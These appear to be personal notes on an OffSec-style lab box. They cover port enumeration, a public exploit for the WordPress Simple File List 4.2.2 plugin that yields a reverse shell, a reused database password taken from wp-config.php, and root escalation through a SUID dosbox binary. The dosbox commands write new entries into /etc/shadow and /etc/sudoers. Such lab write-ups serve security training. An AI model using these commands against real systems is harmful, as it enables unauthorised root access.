nmap shows ports 22, 80 web, 3306 sql, 5000Werkzeug/1.0.1 Python/3.8.5 -- sus
deep nmap shows 13000 web, 36445 samba

Enumeration --

port 80 --
wpsite wpscan dint yeild anything interesting except a directory listing
nothing interesting in the website as well
did --enumerate t, enumerate p, enumerate u
then just set a bruteforce to crack admin's pass

port 3306 - 

port 5000 - 
searchsploit shows a couple of exploits, but we need to find out the version
no webpage loads, nothing on dirb

port 13000 -
"V14 login"
Another login page with the url that goes ?username=admin&pass=password
Something vuln?

port 36445 - 
seems locked down
-+-+-+-+

seems like port 5000 is the easiest
But the exploit did not yeild anything, as it said "debug not enabled"

Next candidate is brute-forcing 13000
Nope!

----
Foothold - 
HINT TAKEN : we overlooked wpscan results, as expected, and turns out, there is a vulnerable plugin, simple file list 4.2.2
searchsploit points us to `php/webapps/48979.py`
and on port 5000, it gives us a rev shell
http!

---
`find / -type f -perm -04000 -ls 2>/dev/null`
shows a new thing, dosbox
gtfobins, shows we can file-write and file-read, or copy file to a readable location using it

So, first, we abuse the effective "writable /etc/shadow" to get ourselves a new root-level user
```zsh
export DATA="root2:$(openssl passwd w00t):0:0:root:/root:/bin/bash"
dosbox -c 'mount c /' -c "echo $DATA >>c:\etc\shadow" -c exit
```

but when I did su root2:w002, it was just saying no such file or dir bash
tried reading /etc/shadow, but that wasnt working neither

After some time, looked up into a walkthrough, and turns out, we need to be logged in via ssh, for the dosbox gtfo to work

So, we look around, and find a wp-config.php in /srv/http/
```
define( 'DB_USER', 'commander' );
/** MySQL database password */
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
```

---
ssh commander@IP
and we see even commander has suid set for dosbox
```zsh
export DOE="$(whoami) ALL=(ALL:ALL) ALL"
dosbox -c 'mount c /' -c "echo $DOE >>c:\etc\sudoers" -c exit
```
NOTE - reading /etc/shadow wasnt working, for some reason
But writing was working well
the writing into /etc/passwd dint go well, same error as before
writing into sudoers worked

---
---
---
the offsec official walktrhough says the dosbox wouldnt work in cli, and needs gui
And, there's a vnc service running on port 5901 vnc
so do port-forwarding,
`vncviewer localhost:5901`

opens up the vnc, xfce
launch terminal,
```dosbox
dosbox
mount C /etc #or mount C /
C:
dir
type shadow #or type /etc/shadow
echo commander ALL=(ALL) ALL >> sudoers
```
back to ssh, sudo su